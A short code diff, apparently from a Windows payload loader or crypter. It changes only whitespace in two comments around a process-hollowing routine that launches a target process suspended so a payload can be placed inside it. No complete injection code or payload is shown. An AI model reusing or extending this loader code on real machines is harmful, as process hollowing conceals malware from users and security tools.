@@ -141,7 +141,7 @@ int main (int argc, char **argv)
 	
 	#ifdef PROCESS_HOLLOWING
 	// Instanciate target process
-	// Target process specified in first bfg argument argv[1]
+	// Target process specified in first bfg argument argv[1]	
 	newRunPE(argv[1], payload);
 	#endif
 
@@ -354,7 +354,7 @@ void newRunPE(LPSTR szFilePath, PVOID pFile) {
 				RtlZeroMemory(&SI, sizeof(SI));
 				RtlZeroMemory(&PI, sizeof(PI));				
 		
-				// Create new instance of target process
+				// Create new instance of target process		
 				if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
 					CTX = (PCONTEXT) VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE);
 					CTX->ContextFlags = CONTEXT_FULL;
